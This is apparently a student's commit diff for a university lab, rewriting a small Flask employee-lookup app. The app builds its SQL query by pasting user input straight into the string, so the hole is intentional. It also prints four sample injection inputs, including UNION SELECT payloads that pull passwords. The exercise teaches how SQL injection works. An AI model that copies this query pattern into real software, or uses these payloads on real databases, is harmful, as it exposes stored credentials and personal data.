38639552d9e90724f4bd084ffa6ac81abeb628b4
Student A10 EE364 <ee364a10@eceprog6.ecn.purdue.edu>
2024-03-08 19:06:27 -0500

    finished part 3

--- Prelab09/Q3/main.py
+++ Prelab09/Q3/main.py
@@ -7,35 +7,47 @@ app = flask.Flask(__name__)
 
 @app.route("/", methods=['GET'])
 def index():
-    return flask.redirect(flask.url_for('create'))
-
-
-@app.route("/create", methods=['GET'])
-def form():
     return flask.render_template("form.html")
 
 
-@app.route("/create", methods=['POST'])
+@app.route("/", methods=['POST'])
 def submit_form():
-    first_name_sub = flask.request.form['fname']
-    last_name_sub = flask.request.form['lname']
     id_sub = flask.request.form['idlabel']
-    email_sub = flask.request.form['mail']
 
-    insert_employee_data(first_name_sub, last_name_sub, id_sub, email_sub)
-
-    return flask.render_template("form.html")
+    emp_data = retrieve_employee_data(id_sub)
+    return flask.render_template("display.html", employee=emp_data)
 
 
-def insert_employee_data(first_name, last_name, id, email):
-    conn = sqlite3.connect("data/company.db")
+def retrieve_employee_data(id):
+    conn = sqlite3.connect("Q3/database.db")
     c = conn.cursor()
-    c.execute(f'''INSERT INTO employees (first_name, last_name, id, email)
-              VALUES('{first_name}', '{last_name}', {id}, '{email}')''')
+    print(f'SELECT id,first_name,last_name,email FROM employees WHERE id={id}')
+    employee = c.execute(f'''SELECT id,first_name,last_name,email FROM
+                         employees WHERE id={id}''').fetchone()
     c.close()
     conn.commit()
     conn.close()
+    return employee
 
 
 if __name__ == '__main__':
     app.run(port=8050, host='127.0.0.1', debug=True, use_evalex=False)
+    print("---------FIRST command that causes an SQL injection----------\n")
+    print("1 OR 1=1") # noqa
+    print("\n The URL for this command is given below : \n")
+    print("http://127.0.0.1:8050/") # noqa
+
+    print("---------SECOND command that causes an SQL injection----------\n")
+    print("id = 1234 UNION SELECT username, password FROM users;") # noqa
+    print("\n The URL for this command is given below : \n")
+    print("http://127.0.0.1:8050/") # noqa
+
+    print("---------THIRD command that causes an SQL injection----------\n")
+    print("12345 or first_name = 'aidan'") # noqa
+    print("\n The URL for this command is given below : \n")
+    print("http://127.0.0.1:8050/") # noqa
+
+    print("---------FOURTH command that causes an SQL injection----------\n")
+    print("1 UNION ALL SELECT id, password, null, null FROM passwords--") # noqa
+    print("\n The URL for this command is given below : \n")
+    print("http://127.0.0.1:8050/") # noqa
